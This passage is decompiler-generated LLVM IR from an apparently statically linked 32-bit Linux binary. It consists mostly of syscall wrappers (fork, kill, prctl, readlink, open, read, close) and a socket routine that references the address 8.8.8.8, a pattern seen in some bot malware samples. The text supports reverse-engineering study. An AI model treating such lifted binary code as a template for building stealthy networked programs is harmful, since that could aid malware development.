dec_label_pc_804f4a2:                             ; preds = %dec_label_pc_804f4b5, %dec_label_pc_804f4a0
  %v2_804f4b03 = phi i32 [ %v1_804f4b5, %dec_label_pc_804f4b5 ], [ 0, %dec_label_pc_804f4a0 ]
  %v1_804f4a2 = add i32 %v0_804f4a2, 1
  %v1_804f4a3 = add i32 %v0_804f4a3, 1
  %v12_804f4a4 = icmp eq i32 %tmp10, %v1_804f4a2
  br i1 %v12_804f4a4, label %dec_label_pc_804f48a, label %dec_label_pc_804f4a8

dec_label_pc_804f4a8:                             ; preds = %dec_label_pc_804f4a2, %dec_label_pc_804f494
  %v0_804f4a2 = phi i32 [ %v1_804f4a2, %dec_label_pc_804f4a2 ], [ 0, %dec_label_pc_804f494 ]
  %v0_804f4b5 = phi i32 [ %v2_804f4b03, %dec_label_pc_804f4a2 ], [ 0, %dec_label_pc_804f494 ]
  %v0_804f4a3 = phi i32 [ %v1_804f4a3, %dec_label_pc_804f4a2 ], [ 1, %dec_label_pc_804f494 ]
  %v3_804f4ac = add i32 %v2_804f4ac, %v0_804f4a3
  %v4_804f4ac = inttoptr i32 %v3_804f4ac to i8*
  %v5_804f4ac = load i8, i8* %v4_804f4ac, align 1
  %v4_804f4b0 = add i32 %v0_804f4b5, %tmp8
  %v5_804f4b0 = inttoptr i32 %v4_804f4b0 to i8*
  %v6_804f4b0 = load i8, i8* %v5_804f4b0, align 1
  %v17_804f4b0 = icmp eq i8 %v5_804f4ac, %v6_804f4b0
  %v1_804f4b3 = icmp eq i1 %v17_804f4b0, false
  br i1 %v1_804f4b3, label %dec_label_pc_804f4a0, label %dec_label_pc_804f4b5

dec_label_pc_804f4b5:                             ; preds = %dec_label_pc_804f4a8
  %v1_804f4b5 = add i32 %v0_804f4b5, 1
  %v12_804f4b6 = icmp eq i32 %tmp9, %v1_804f4b5
  %v1_804f4b8 = icmp eq i1 %v12_804f4b6, false
  br i1 %v1_804f4b8, label %dec_label_pc_804f4a2, label %dec_label_pc_804f48a

; uselistorder directives
  uselistorder i32 %v0_804f4a3, { 2, 0, 1 }
  uselistorder i32 %v0_804f4b5, { 1, 0 }
  uselistorder i32 %v1_804f4a2, { 1, 0 }
  uselistorder i32 %tmp10, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f48a, { 1, 0, 2 }
}

define i32 @function_804f630() local_unnamed_addr {
dec_label_pc_804f630:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 16, i32* %stack_var_-12, align 4
  %v1_804f63d = call i32 @function_804fe1b(i32 16)
  %v1_804f642 = inttoptr i32 %v1_804f63d to i32*
  store i32 0, i32* %v1_804f642, align 4
  %v4_804f64f = call i32 @function_80500a4(i32 2, i32 2, i32 0, i32 %v1_804f63d)
  store i32 %v4_804f64f, i32* %esi.global-to-local, align 4
  %v10_804f65b = icmp eq i32 %v4_804f64f, -1
  br i1 %v10_804f65b, label %dec_label_pc_804f6a2, label %dec_label_pc_804f660

dec_label_pc_804f660:                             ; preds = %dec_label_pc_804f630
  %v2_804f660 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804f660, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-28, align 4
  %v3_804f67f = call i32 @function_804feec(i32 %v4_804f64f, i32 %v2_804f660, i32 16)
  %v2_804f687 = ptrtoint i32* %stack_var_-12 to i32
  %v0_804f68d = load i32, i32* %esi.global-to-local, align 4
  %v3_804f68e = call i32 @function_804ff17(i32 %v0_804f68d, i32 %v2_804f660, i32 %v2_804f687)
  %v1_804f696 = call i32 @function_804f8e3(i32 %v0_804f68d)
  br label %dec_label_pc_804f6a2

dec_label_pc_804f6a2:                             ; preds = %dec_label_pc_804f630, %dec_label_pc_804f660
  %v0_804f6a7 = phi i32 [ 0, %dec_label_pc_804f630 ], [ 134744072, %dec_label_pc_804f660 ]
  ret i32 %v0_804f6a7

; uselistorder directives
  uselistorder i32 %v4_804f64f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_804feec, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_80500a4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f6a2, { 1, 0 }
}

define i32 @function_804f84d(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804f84d:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804f84d = load i32, i32* @edi, align 4
  %v0_804f84e = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804f862 = add i32 %arg2, -12
  store i32 %arg3, i32* @edx, align 4
  %v6_804f86c = icmp ugt i32 %v1_804f862, 2
  br i1 %v6_804f86c, label %dec_label_pc_804f87c, label %dec_label_pc_804f86e

dec_label_pc_804f86e:                             ; preds = %dec_label_pc_804f84d
  %v4_804f872 = call i32 @function_804f8a4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_804f862)
  br label %dec_label_pc_804f89e

dec_label_pc_804f87c:                             ; preds = %dec_label_pc_804f84d
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804f884 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_804f884, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_804f884, -4095
  br i1 %tmp17, label %dec_label_pc_804f89c, label %dec_label_pc_804f890

dec_label_pc_804f890:                             ; preds = %dec_label_pc_804f87c
  %v1_804f890 = call i32 @function_804fe1b(i32 %v0_804f84e)
  %v0_804f895 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f895 = sub i32 0, %v0_804f895
  %v2_804f897 = inttoptr i32 %v1_804f890 to i32*
  store i32 %v1_804f895, i32* %v2_804f897, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f89c

dec_label_pc_804f89c:                             ; preds = %dec_label_pc_804f87c, %dec_label_pc_804f890
  %v0_804f89c = phi i32 [ %v2_804f884, %dec_label_pc_804f87c ], [ -1, %dec_label_pc_804f890 ]
  br label %dec_label_pc_804f89e

dec_label_pc_804f89e:                             ; preds = %dec_label_pc_804f86e, %dec_label_pc_804f89c
  %v0_804f8a3 = phi i32 [ %v4_804f872, %dec_label_pc_804f86e ], [ %v0_804f89c, %dec_label_pc_804f89c ]
  store i32 %v0_804f84e, i32* @ebx, align 4
  store i32 %v0_804f84d, i32* @edi, align 4
  ret i32 %v0_804f8a3

; uselistorder directives
  uselistorder i32 %v2_804f884, { 1, 0, 2 }
  uselistorder i32 %v0_804f84e, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804f89e, { 1, 0 }
  uselistorder label %dec_label_pc_804f89c, { 1, 0 }
}

define i32 @function_804f8a4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f8a4:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f8a4 = load i32, i32* @edi, align 4
  store i32 %v0_804f8a4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_804f8bc = load i32, i32* @ebx, align 4
  %v1_804f8c4 = call i32 @int80_syscall(i32 221)
  store i32 %v1_804f8c4, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_804f8c4, -4095
  br i1 %tmp12, label %dec_label_pc_804f8dc, label %dec_label_pc_804f8d0

dec_label_pc_804f8d0:                             ; preds = %dec_label_pc_804f8a4
  %v1_804f8d0 = call i32 @function_804fe1b(i32 %v0_804f8bc)
  %v0_804f8d5 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f8d5 = sub i32 0, %v0_804f8d5
  %v2_804f8d7 = inttoptr i32 %v1_804f8d0 to i32*
  store i32 %v1_804f8d5, i32* %v2_804f8d7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804f8e1.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804f8dc

dec_label_pc_804f8dc:                             ; preds = %dec_label_pc_804f8a4, %dec_label_pc_804f8d0
  %v2_804f8e1 = phi i32 [ %v0_804f8a4, %dec_label_pc_804f8a4 ], [ %v2_804f8e1.pre, %dec_label_pc_804f8d0 ]
  %v0_804f8dc = phi i32 [ %v1_804f8c4, %dec_label_pc_804f8a4 ], [ -1, %dec_label_pc_804f8d0 ]
  store i32 %v2_804f8e1, i32* %edi.global-to-local, align 4
  ret i32 %v0_804f8dc

; uselistorder directives
  uselistorder i32 %v1_804f8c4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f8dc, { 1, 0 }
}

define i32 @function_804f8e3(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f8e3:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f8e3 = load i32, i32* @edi, align 4
  store i32 %v0_804f8e3, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804f8eb = load i32, i32* @ebx, align 4
  %v1_804f8f3 = call i32 @close(i32 %arg1)
  store i32 %v0_804f8eb, i32* @ebx, align 4
  store i32 %v1_804f8f3, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_804f8f3, -4095
  br i1 %tmp9, label %dec_label_pc_804f90b, label %dec_label_pc_804f8ff

dec_label_pc_804f8ff:                             ; preds = %dec_label_pc_804f8e3
  %v1_804f8ff = call i32 @function_804fe1b(i32 %v0_804f8eb)
  %v0_804f904 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f904 = sub i32 0, %v0_804f904
  %v2_804f906 = inttoptr i32 %v1_804f8ff to i32*
  store i32 %v1_804f904, i32* %v2_804f906, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804f90f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804f90b

dec_label_pc_804f90b:                             ; preds = %dec_label_pc_804f8e3, %dec_label_pc_804f8ff
  %v2_804f90f = phi i32 [ %v0_804f8e3, %dec_label_pc_804f8e3 ], [ %v2_804f90f.pre, %dec_label_pc_804f8ff ]
  %v0_804f90b = phi i32 [ %v1_804f8f3, %dec_label_pc_804f8e3 ], [ -1, %dec_label_pc_804f8ff ]
  store i32 %v2_804f90f, i32* @edi, align 4
  ret i32 %v0_804f90b

; uselistorder directives
  uselistorder i32 %v1_804f8f3, { 1, 0, 2 }
  uselistorder i32 %v0_804f8eb, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f90b, { 1, 0 }
}

define i32 @function_804f911() local_unnamed_addr {
dec_label_pc_804f911:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f911 = load i32, i32* @ebx, align 4
  store i32 %v0_804f911, i32* %stack_var_-4, align 4
  %v1_804f91a = call i32 @fork(i32 %v0_804f911)
  store i32 %v1_804f91a, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_804f91a, -4095
  br i1 %tmp7, label %dec_label_pc_804f931, label %dec_label_pc_804f925

dec_label_pc_804f925:                             ; preds = %dec_label_pc_804f911
  %v1_804f925 = call i32 @function_804fe1b(i32 %v0_804f911)
  %v0_804f92a = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f92a = sub i32 0, %v0_804f92a
  %v2_804f92c = inttoptr i32 %v1_804f925 to i32*
  store i32 %v1_804f92a, i32* %v2_804f92c, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804f935.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804f931

dec_label_pc_804f931:                             ; preds = %dec_label_pc_804f911, %dec_label_pc_804f925
  %v2_804f935 = phi i32 [ %v0_804f911, %dec_label_pc_804f911 ], [ %v2_804f935.pre, %dec_label_pc_804f925 ]
  %v0_804f931 = phi i32 [ %v1_804f91a, %dec_label_pc_804f911 ], [ -1, %dec_label_pc_804f925 ]
  store i32 %v2_804f935, i32* @ebx, align 4
  ret i32 %v0_804f931

; uselistorder directives
  uselistorder i32 %v1_804f91a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f931, { 1, 0 }
}

define i32 @function_804f937() local_unnamed_addr {
dec_label_pc_804f937:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f937 = load i32, i32* @ebx, align 4
  store i32 %v0_804f937, i32* %stack_var_-4, align 4
  %v1_804f940 = call i32 @getpid(i32 %v0_804f937)
  store i32 %v1_804f940, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_804f940, -4095
  br i1 %tmp7, label %dec_label_pc_804f957, label %dec_label_pc_804f94b

dec_label_pc_804f94b:                             ; preds = %dec_label_pc_804f937
  %v1_804f94b = call i32 @function_804fe1b(i32 %v0_804f937)
  %v0_804f950 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f950 = sub i32 0, %v0_804f950
  %v2_804f952 = inttoptr i32 %v1_804f94b to i32*
  store i32 %v1_804f950, i32* %v2_804f952, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804f95b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804f957

dec_label_pc_804f957:                             ; preds = %dec_label_pc_804f937, %dec_label_pc_804f94b
  %v2_804f95b = phi i32 [ %v0_804f937, %dec_label_pc_804f937 ], [ %v2_804f95b.pre, %dec_label_pc_804f94b ]
  %v0_804f957 = phi i32 [ %v1_804f940, %dec_label_pc_804f937 ], [ -1, %dec_label_pc_804f94b ]
  %v2_804f959 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f959, i32* @edx, align 4
  store i32 %v2_804f95b, i32* @ebx, align 4
  ret i32 %v0_804f957

; uselistorder directives
  uselistorder i32 %v1_804f940, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f957, { 1, 0 }
}

define i32 @function_804f95d() local_unnamed_addr {
dec_label_pc_804f95d:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f95d = load i32, i32* @ebx, align 4
  store i32 %v0_804f95d, i32* %stack_var_-4, align 4
  %v1_804f966 = call i32 @getppid(i32 %v0_804f95d)
  store i32 %v1_804f966, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_804f966, -4095
  br i1 %tmp7, label %dec_label_pc_804f97d, label %dec_label_pc_804f971

dec_label_pc_804f971:                             ; preds = %dec_label_pc_804f95d
  %v1_804f971 = call i32 @function_804fe1b(i32 %v0_804f95d)
  %v0_804f976 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f976 = sub i32 0, %v0_804f976
  %v2_804f978 = inttoptr i32 %v1_804f971 to i32*
  store i32 %v1_804f976, i32* %v2_804f978, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804f981.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804f97d

dec_label_pc_804f97d:                             ; preds = %dec_label_pc_804f95d, %dec_label_pc_804f971
  %v2_804f981 = phi i32 [ %v0_804f95d, %dec_label_pc_804f95d ], [ %v2_804f981.pre, %dec_label_pc_804f971 ]
  %v0_804f97d = phi i32 [ %v1_804f966, %dec_label_pc_804f95d ], [ -1, %dec_label_pc_804f971 ]
  store i32 %v2_804f981, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804f97d

; uselistorder directives
  uselistorder i32 %v1_804f966, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f97d, { 1, 0 }
}

define i32 @function_804f983(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804f983:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f983 = load i32, i32* @edi, align 4
  store i32 %v0_804f983, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804f99b = load i32, i32* @ebx, align 4
  %v2_804f9a3 = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v2_804f9a3, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v2_804f9a3, -4095
  br i1 %tmp12, label %dec_label_pc_804f9bb, label %dec_label_pc_804f9af

dec_label_pc_804f9af:                             ; preds = %dec_label_pc_804f983
  %v1_804f9af = call i32 @function_804fe1b(i32 %v0_804f99b)
  %v0_804f9b4 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f9b4 = sub i32 0, %v0_804f9b4
  %v2_804f9b6 = inttoptr i32 %v1_804f9af to i32*
  store i32 %v1_804f9b4, i32* %v2_804f9b6, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804f9c0.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804f9bb

dec_label_pc_804f9bb:                             ; preds = %dec_label_pc_804f983, %dec_label_pc_804f9af
  %v2_804f9c0 = phi i32 [ %v0_804f983, %dec_label_pc_804f983 ], [ %v2_804f9c0.pre, %dec_label_pc_804f9af ]
  %v0_804f9bb = phi i32 [ %v2_804f9a3, %dec_label_pc_804f983 ], [ -1, %dec_label_pc_804f9af ]
  store i32 %v2_804f9c0, i32* %edi.global-to-local, align 4
  ret i32 %v0_804f9bb

; uselistorder directives
  uselistorder i32 %v2_804f9a3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f9bb, { 1, 0 }
}

define i32 @function_804f9c2(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f9c2:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f9c2 = load i32, i32* @ebx, align 4
  store i32 %v0_804f9c2, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804f9d5 = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_804f9d5, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_804f9d5, -4095
  br i1 %tmp9, label %dec_label_pc_804f9ee, label %dec_label_pc_804f9e2

dec_label_pc_804f9e2:                             ; preds = %dec_label_pc_804f9c2
  %v1_804f9e2 = call i32 @function_804fe1b(i32 %v0_804f9c2)
  %v0_804f9e7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f9e7 = sub i32 0, %v0_804f9e7
  %v2_804f9e9 = inttoptr i32 %v1_804f9e2 to i32*
  store i32 %v1_804f9e7, i32* %v2_804f9e9, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804f9f2.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804f9ee

dec_label_pc_804f9ee:                             ; preds = %dec_label_pc_804f9c2, %dec_label_pc_804f9e2
  %v2_804f9f2 = phi i32 [ %v0_804f9c2, %dec_label_pc_804f9c2 ], [ %v2_804f9f2.pre, %dec_label_pc_804f9e2 ]
  %v0_804f9ee = phi i32 [ %v2_804f9d5, %dec_label_pc_804f9c2 ], [ -1, %dec_label_pc_804f9e2 ]
  %v2_804f9f0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f9f0, i32* @edx, align 4
  store i32 %v2_804f9f2, i32* @ebx, align 4
  ret i32 %v0_804f9ee

; uselistorder directives
  uselistorder i32 %v2_804f9d5, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f9ee, { 1, 0 }
}

define i32 @function_804f9f4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804f9f4:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804f9f5 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_804f9fb = sdiv i32 %sext, 16777216
  %v4_804f9ff = ptrtoint i8* %arg1 to i32
  %v3_804fa03 = and i32 %arg2, 64
  %v4_804fa03 = icmp eq i32 %v3_804fa03, 0
  br i1 %v4_804fa03, label %dec_label_pc_804fa14, label %dec_label_pc_804fa08

dec_label_pc_804fa08:                             ; preds = %dec_label_pc_804f9f4
  br label %dec_label_pc_804fa14

dec_label_pc_804fa14:                             ; preds = %dec_label_pc_804f9f4, %dec_label_pc_804fa08
  store i32 %v4_804f9ff, i32* %ebx.global-to-local, align 4
  %v5_804fa1f = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_804f9fb)
  store i32 %v5_804fa1f, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_804fa1f, -4095
  br i1 %tmp15, label %dec_label_pc_804fa37, label %dec_label_pc_804fa2b

dec_label_pc_804fa2b:                             ; preds = %dec_label_pc_804fa14
  %v1_804fa2b = call i32 @function_804fe1b(i32 %v0_804f9f5)
  %v0_804fa30 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fa30 = sub i32 0, %v0_804fa30
  %v2_804fa32 = inttoptr i32 %v1_804fa2b to i32*
  store i32 %v1_804fa30, i32* %v2_804fa32, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fa37

dec_label_pc_804fa37:                             ; preds = %dec_label_pc_804fa14, %dec_label_pc_804fa2b
  %v0_804fa37 = phi i32 [ %v5_804fa1f, %dec_label_pc_804fa14 ], [ -1, %dec_label_pc_804fa2b ]
  store i32 %v0_804f9f5, i32* @ebx, align 4
  ret i32 %v0_804fa37

; uselistorder directives
  uselistorder i32 %v5_804fa1f, { 1, 0, 2 }
  uselistorder i32 %v0_804f9f5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804fa37, { 1, 0 }
  uselistorder label %dec_label_pc_804fa14, { 1, 0 }
}

define i32 @function_804fa3f(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804fa3f:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804fa40 = load i32, i32* @esi, align 4
  store i32 %v0_804fa40, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804fa58 = load i32, i32* @ebx, align 4
  %v5_804fa60 = call i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5)
  store i32 %v5_804fa60, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v5_804fa60, -4095
  br i1 %tmp12, label %dec_label_pc_804fa78, label %dec_label_pc_804fa6c

dec_label_pc_804fa6c:                             ; preds = %dec_label_pc_804fa3f
  %v1_804fa6c = call i32 @function_804fe1b(i32 %v0_804fa58)
  %v0_804fa71 = load i32, i32* %esi.global-to-local, align 4
  %v1_804fa71 = sub i32 0, %v0_804fa71
  %v2_804fa73 = inttoptr i32 %v1_804fa6c to i32*
  store i32 %v1_804fa71, i32* %v2_804fa73, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_804fa7b.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_804fa78

dec_label_pc_804fa78:                             ; preds = %dec_label_pc_804fa3f, %dec_label_pc_804fa6c
  %v2_804fa7b = phi i32 [ %v0_804fa40, %dec_label_pc_804fa3f ], [ %v2_804fa7b.pre, %dec_label_pc_804fa6c ]
  %v0_804fa78 = phi i32 [ %v5_804fa60, %dec_label_pc_804fa3f ], [ -1, %dec_label_pc_804fa6c ]
  store i32 %v2_804fa7b, i32* %esi.global-to-local, align 4
  ret i32 %v0_804fa78

; uselistorder directives
  uselistorder i32 %v5_804fa60, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fa78, { 1, 0 }
}

define i32 @function_804fa7e(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804fa7e:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fa7e = load i32, i32* @edi, align 4
  store i32 %v0_804fa7e, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804fa8e = load i32, i32* @ebx, align 4
  %v4_804fa96 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_804fa96, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_804fa96, -4095
  br i1 %tmp12, label %dec_label_pc_804faae, label %dec_label_pc_804faa2

dec_label_pc_804faa2:                             ; preds = %dec_label_pc_804fa7e
  %v1_804faa2 = call i32 @function_804fe1b(i32 %v0_804fa8e)
  %v0_804faa7 = load i32, i32* %edi.global-to-local, align 4
  %v1_804faa7 = sub i32 0, %v0_804faa7
  %v2_804faa9 = inttoptr i32 %v1_804faa2 to i32*
  store i32 %v1_804faa7, i32* %v2_804faa9, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804fab2.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804faae

dec_label_pc_804faae:                             ; preds = %dec_label_pc_804fa7e, %dec_label_pc_804faa2
  %v2_804fab2 = phi i32 [ %v0_804fa7e, %dec_label_pc_804fa7e ], [ %v2_804fab2.pre, %dec_label_pc_804faa2 ]
  %v0_804faae = phi i32 [ %v4_804fa96, %dec_label_pc_804fa7e ], [ -1, %dec_label_pc_804faa2 ]
  store i32 %v2_804fab2, i32* %edi.global-to-local, align 4
  ret i32 %v0_804faae

; uselistorder directives
  uselistorder i32 %v4_804fa96, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804faae, { 1, 0 }
}

define i32 @function_804fab4(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804fab4:
  %edi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg2 to i8*
  %stack_var_-4 = alloca i32, align 4
  %v0_804fab4 = load i32, i32* @edi, align 4
  store i32 %v0_804fab4, i32* %stack_var_-4, align 4
  %v4_804fab8 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804fab8, i32* %edi.global-to-local, align 4
  %v0_804fac4 = load i32, i32* @ebx, align 4
  %v7_804facc = call i32 @readlink(i8* %arg1, i8* %tmp5, i32 %arg3)
  store i32 %v7_804facc, i32* %edi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_804facc, -4095
  br i1 %tmp13, label %dec_label_pc_804fae4, label %dec_label_pc_804fad8

dec_label_pc_804fad8:                             ; preds = %dec_label_pc_804fab4
  %v1_804fad8 = call i32 @function_804fe1b(i32 %v0_804fac4)
  %v0_804fadd = load i32, i32* %edi.global-to-local, align 4
  %v1_804fadd = sub i32 0, %v0_804fadd
  %v2_804fadf = inttoptr i32 %v1_804fad8 to i32*
  store i32 %v1_804fadd, i32* %v2_804fadf, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804fae8.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fae4

dec_label_pc_804fae4:                             ; preds = %dec_label_pc_804fab4, %dec_label_pc_804fad8
  %v2_804fae8 = phi i32 [ %v0_804fab4, %dec_label_pc_804fab4 ], [ %v2_804fae8.pre, %dec_label_pc_804fad8 ]
  %v0_804fae4 = phi i32 [ %v7_804facc, %dec_label_pc_804fab4 ], [ -1, %dec_label_pc_804fad8 ]
  store i32 %v2_804fae8, i32* %edi.global-to-local, align 4
  ret i32 %v0_804fae4

; uselistorder directives
  uselistorder i32 %v7_804facc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fae4, { 1, 0 }
}

define i32 @function_804faea() local_unnamed_addr {
dec_label_pc_804faea:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804faeb = load i32, i32* @esi, align 4
  store i32 %v0_804faeb, i32* %stack_var_-8, align 4
  %v0_804fb03 = load i32, i32* @ebx, align 4
  %v1_804fb0b = call i32 @int80_syscall(i32 142)
  store i32 %v0_804fb03, i32* @ebx, align 4
  store i32 %v1_804fb0b, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_804fb0b, -4095
  br i1 %tmp12, label %dec_label_pc_804fb23, label %dec_label_pc_804fb17

dec_label_pc_804fb17:                             ; preds = %dec_label_pc_804faea
  %v1_804fb17 = call i32 @function_804fe1b(i32 %v0_804fb03)
  %v0_804fb1c = load i32, i32* %esi.global-to-local, align 4
  %v1_804fb1c = sub i32 0, %v0_804fb1c
  %v2_804fb1e = inttoptr i32 %v1_804fb17 to i32*
  store i32 %v1_804fb1c, i32* %v2_804fb1e, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_804fb26.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_804fb23

dec_label_pc_804fb23:                             ; preds = %dec_label_pc_804faea, %dec_label_pc_804fb17
  %v2_804fb26 = phi i32 [ %v0_804faeb, %dec_label_pc_804faea ], [ %v2_804fb26.pre, %dec_label_pc_804fb17 ]
  %v0_804fb23 = phi i32 [ %v1_804fb0b, %dec_label_pc_804faea ], [ -1, %dec_label_pc_804fb17 ]
  store i32 %v2_804fb26, i32* @esi, align 4
  ret i32 %v0_804fb23

; uselistorder directives
  uselistorder i32 %v1_804fb0b, { 1, 0, 2 }
  uselistorder i32 %v0_804fb03, { 1, 0 }
  uselistorder label %dec_label_pc_804fb23, { 1, 0 }
}

define i32 @function_804fb29() local_unnamed_addr {
dec_label_pc_804fb29:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fb29 = load i32, i32* @ebx, align 4
